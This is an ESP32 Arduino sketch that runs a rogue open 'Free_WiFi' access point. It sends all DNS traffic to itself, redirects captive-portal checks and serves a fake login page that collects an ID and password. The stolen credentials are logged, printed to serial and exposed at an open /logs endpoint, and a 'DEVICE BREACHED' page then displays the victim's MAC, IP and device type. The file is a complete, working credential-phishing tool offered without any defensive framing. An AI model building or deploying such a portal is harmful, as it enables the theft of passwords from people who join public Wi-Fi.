#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_event.h"

extern "C" {
  #include "esp_wifi.h"
}

#define FLASH_LED_PIN 4

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

String loginLogs = "";
const char* ssid = "Free_WiFi";
const char* password = "";

struct ClientInfo {
  String mac;
  int rssi;
  String ip;
  String deviceType;
};

// Login page now just a hidden field for deviceType (filled by JS), no device shown here
String loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Free Wi-Fi Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
  body {
    background: #f0f8ff;
    overflow: hidden;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .shape {
    position: absolute;
    border-radius: 50%;
    opacity: 0.6;
    animation: floaty 10s infinite ease-in-out;
  }
  .shape1 { width: 120px; height: 120px; background: #ff7f50; top: 10%; left: 15%; animation-delay: 0s; }
  .shape2 { width: 80px; height: 80px; background: #00ced1; top: 40%; left: 70%; animation-delay: 2s; }
  .shape3 { width: 100px; height: 100px; background: #ff69b4; top: 70%; left: 30%; animation-delay: 4s; }
  .shape4 { width: 140px; height: 140px; background: #90ee90; top: 20%; left: 80%; animation-delay: 6s; }
  @keyframes floaty {
    0%, 100% { transform: translateY(0) rotate(0deg); }
    50% { transform: translateY(-40px) rotate(45deg); }
  }
  .login-box {
    background: white;
    padding: 2rem;
    border-radius: 20px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
    width: 90%;
    max-width: 350px;
    z-index: 10;
    position: relative;
    animation: popin 1s ease;
  }
  @keyframes popin {
    from { transform: scale(0.8); opacity: 0; }
    to { transform: scale(1); opacity: 1; }
  }
  .login-box h2 {
    color: #333;
    text-align: center;
    margin-bottom: 1rem;
  }
  input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 10px;
    border: 2px solid #ccc;
    font-size: 1rem;
    transition: 0.3s;
  }
  input:focus {
    border-color: #ff7f50;
    box-shadow: 0 0 8px #ff7f50;
    outline: none;
  }
  button {
    width: 100%;
    padding: 12px;
    background: #00ced1;
    color: white;
    border: none;
    border-radius: 10px;
    font-size: 1rem;
    cursor: pointer;
    transition: 0.3s;
  }
  button:hover {
    background: #009fa5;
    transform: scale(1.05);
  }
  #errorMsg {
    color: red;
    text-align: center;
    margin-top: 10px;
    font-weight: bold;
  }
</style>
</head>
<body>
  <div class="shape shape1"></div>
  <div class="shape shape2"></div>
  <div class="shape shape3"></div>
  <div class="shape shape4"></div>

  <div class="login-box">
    <h2>Free Wi-Fi Login</h2>
    <form method="POST" action="/login" onsubmit="return validateID()">
      <input type="text" id="idInput" name="username" placeholder="Enter 10-digit ID" maxlength="10" required />
      <input type="password" name="password" placeholder="Password" required />
      <!-- Hidden field for device type -->
      <input type="hidden" id="deviceType" name="deviceType" value="" />
      <button type="submit">Connect</button>
    </form>
    <p id="errorMsg"></p>
  </div>

  <script>
    function validateID() {
      let idValue = document.getElementById('idInput').value.trim();
      let errorMsg = document.getElementById('errorMsg');
      errorMsg.textContent = '';
      if (!/^\d+$/.test(idValue)) {
        errorMsg.textContent = 'Only numbers in ID';
        return false;
      }
      if (idValue.length !== 10) {
        errorMsg.textContent = 'Provide proper ID';
        return false;
      }
      return true;
    }

    // Detect device type and store it in hidden input
    document.addEventListener("DOMContentLoaded", function() {
      let ua = navigator.userAgent;
      let device = "Unknown Device";
      if (/android/i.test(ua)) device = "Android Device";
      else if (/iphone/i.test(ua)) device = "iPhone";
      else if (/ipad/i.test(ua)) device = "iPad";
      else if (/windows/i.test(ua)) device = "Windows PC";
      else if (/mac/i.test(ua)) device = "Mac";
      document.getElementById("deviceType").value = device;
    });
  </script>
</body>
</html>
)rawliteral";

// Breach page with device info and now device type shown here
String breachPageTemplate = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>!!! DEVICE BREACHED !!!</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  body {
    background: radial-gradient(circle at center, #330000 0%, #000000 100%);
    color: #ff0000;
    font-family: 'Share Tech Mono', monospace;
    text-align: center;
    padding: 2rem;
    user-select: none;
    overflow-x: hidden;
  }
  h1 {
    font-size: 3.5rem;
    margin-bottom: 0.5rem;
    text-shadow:
      0 0 5px #ff0000,
      0 0 10px #ff0000,
      0 0 20px #ff0000,
      0 0 40px #ff0000;
    animation: flicker 1.5s infinite alternate;
  }
  p {
    font-size: 1.5rem;
    margin-top: 1rem;
    text-shadow: 0 0 6px #ff0000;
  }
  .glitch {
    position: relative;
    color: #ff0000;
    font-size: 1.2rem;
    animation: glitch-anim 2s infinite;
  }
  @keyframes flicker {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }
  }
  @keyframes glitch-anim {
    0% {
      text-shadow:
        2px 0 red,
        -2px 0 cyan;
      transform: translate(0);
    }
    20% {
      text-shadow:
        -2px 0 red,
        2px 0 cyan;
      transform: translate(-1px, 1px);
    }
    40% {
      text-shadow:
        2px 0 red,
        -2px 0 cyan;
      transform: translate(1px, -1px);
    }
    60% {
      text-shadow:
        -2px 0 red,
        2px 0 cyan;
      transform: translate(-1px, 1px);
    }
    80% {
      text-shadow:
        2px 0 red,
        -2px 0 cyan;
      transform: translate(1px, -1px);
    }
    100% {
      text-shadow:
        -2px 0 red,
        2px 0 cyan;
      transform: translate(0);
    }
  }
</style>
</head>
<body>
  <h1>!!! DEVICE IS NOW FULLY BREACHED !!!</h1>
  <p class="glitch">Your device has been compromised.</p>
  <p>Device Type: <strong>%DEVICE%</strong></p>
  <p>MAC Address: <strong>%MAC%</strong></p>
  <p>RSSI (Signal Strength): <strong>%RSSI% dBm</strong></p>
  <p>Your IP Address: <strong>%IP%</strong></p>
  <p>All your data are belong to us.</p>
</body>
</html>
)rawliteral";

ClientInfo getClientInfo(String deviceTypeFromPost) {
  ClientInfo info;
  wifi_sta_list_t stationList;
  esp_wifi_ap_get_sta_list(&stationList);

  IPAddress clientIP = server.client().remoteIP();
  info.ip = clientIP.toString();
  info.deviceType = deviceTypeFromPost;

  if (stationList.num > 0) {
    wifi_sta_info_t station = stationList.sta[0];
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
      station.mac[0], station.mac[1], station.mac[2],
      station.mac[3], station.mac[4], station.mac[5]);
    info.mac = String(macStr);
    info.rssi = station.rssi;
  } else {
    info.mac = "Unknown";
    info.rssi = -100;
  }

  return info;
}

void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleLogin() {
  if (server.hasArg("username") && server.hasArg("password") && server.hasArg("deviceType")) {
    String user = server.arg("username");
    String pass = server.arg("password");
    String deviceType = server.arg("deviceType");
    String entry = "ID: " + user + " | Password: " + pass + " | Device: " + deviceType + "\n";
    loginLogs += entry;
    Serial.println(entry);

    ClientInfo info = getClientInfo(deviceType);
    String page = breachPageTemplate;
    page.replace("%MAC%", info.mac);
    page.replace("%RSSI%", String(info.rssi));
    page.replace("%IP%", info.ip);
    page.replace("%DEVICE%", info.deviceType);

    server.send(200, "text/html", page);
  } else {
    // Missing data: just redirect back to login
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  }
}

void handleLogs() {
  server.send(200, "text/plain", loginLogs);
}

void handleCaptive() {
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  pinMode(FLASH_LED_PIN, OUTPUT);
  digitalWrite(FLASH_LED_PIN, LOW);

  WiFi.softAP(ssid, password);
  delay(100);
  Serial.println("✅ AP Started: Free_WiFi");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/logs", handleLogs);

  server.on("/generate_204", handleCaptive);
  server.on("/hotspot-detect.html", handleCaptive);
  server.on("/connecttest.txt", handleCaptive);
  server.on("/wpad.dat", handleCaptive);
  server.on("/ncsi.txt", handleCaptive);
  server.on("/redirect", handleCaptive);
  server.onNotFound(handleCaptive);

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
